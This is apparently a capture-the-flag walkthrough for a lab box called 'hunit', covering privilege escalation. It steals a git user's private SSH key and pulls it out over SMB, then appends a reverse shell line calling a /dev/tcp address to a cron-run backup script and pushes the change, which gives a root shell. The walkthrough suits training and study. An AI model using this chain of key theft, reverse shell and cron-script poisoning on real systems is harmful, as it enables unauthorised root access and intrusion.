@@ -1,1 +1,79 @@
+PE
+There is a backup file for a crontab which gives us information about cronjob which are running every 3 & 2 minutes as a root.
+
+[dademola@hunit ~]$ cat /etc/crontab.bak 
+*/3 * * * * /root/git-server/backups.sh
+*/2 * * * * /root/pull.sh
+
+We find ssh keys in home folder of git user:
+[dademola@hunit ~]$ cd ../git/
+[dademola@hunit git]$ ls
+git-shell-commands
+[dademola@hunit git]$ ls -la
+total 28
+drwxr-xr-x 4 git  git  4096 Nov  5  2020 .
+drwxr-xr-x 4 root root 4096 Nov  5  2020 ..
+-rw------- 1 git  git     0 Jan 15  2021 .bash_history
+-rw-r--r-- 1 git  git    21 Aug  9  2020 .bash_logout
+-rw-r--r-- 1 git  git    57 Aug  9  2020 .bash_profile
+-rw-r--r-- 1 git  git   141 Aug  9  2020 .bashrc
+drwxr-xr-x 2 git  git  4096 Nov  5  2020 .ssh
+drwxr-xr-x 2 git  git  4096 Nov  5  2020 git-shell-commands
+[dademola@hunit git]$ cd .ssh/
+[dademola@hunit .ssh]$ ls
+authorized_keys  id_rsa  id_rsa.pub
+
+We will copy id_rsa to shared folder which can be accessed by smb:
+[dademola@hunit .ssh]$ cp id_rsa ../../dademola/shared/
+
+Now download the file in your local machine and change permission of the key:
+┌──(imtodess㉿deathnote)-[~/oscp/boxes/pg/hunit]                                                                                                                        
+└─$ smbclient '//192.168.245.125/commander' -p 12445                                                                                                                    
+Enter WORKGROUP\imtodess's password:                                                                                                                                    
+Anonymous login successful                                                                                                                                              
+Try "help" to get a list of possible commands.                                                                                                                          
+smb: \> get id_rsa                                                                                                                                                      
+getting file \id_rsa of size 2590 as id_rsa (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)                                                                             
+smb: \> exit
+
+└─$ chmod 600 id_rsa    
+
+Using the private ssh key we can login to restricted git shell:
+└─$ ssh -i id_rsa git@192.168.245.125 -p 43022                                                                                                                    
+Last login: Tue Aug 24 12:30:40 2021 from 192.168.49.245
+git> 
+
+Clone the repo to your machine:
+└─$ GIT_SSH_COMMAND='ssh -i ../loot/id_rsa -p 43022' git clone git@192.168.254.125:/git-server <-- This is the tricky part                                                                          
+Cloning into 'git-server'...                                                                                                                                            
+remote: Enumerating objects: 12, done.                                                                                                                                  
+remote: Counting objects: 100% (12/12), done.                                                                                                                           
+remote: Compressing objects: 100% (9/9), done.                                                                                                                          
+remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0                                                                                                           
+Receiving objects: 100% (12/12), done.                                                                                                                                  
+Resolving deltas: 100% (2/2), done.    
+
+Add the following reverse shell payload to script and make it executable:
+# edit ip and port according to your need
+└─$ echo "sh -i >& /dev/tcp/192.168.49.154/18030 0>&1" >> backups.sh                
+└─$ chmod +x backups.sh       
+
+Now just push the commit to master branch:
+└─$ git add -A                                                                      
+└─$ git commit -m "PE"                    
+[master f4a83c4] PE                       
+ 1 file changed, 1 insertion(+)           
+ mode change 100644 => 100755 backups.sh  
+
+└─$ GIT_SSH_COMMAND='ssh -i ../../loot/id_rsa -p 43022' git push origin master                                                                                          
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 373 bytes | 373.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+To 192.168.245.125:/git-server
+   b50f4e5..f4a83c4  master -> master
+
+ After 5 minutes we will have the shell as root.
 
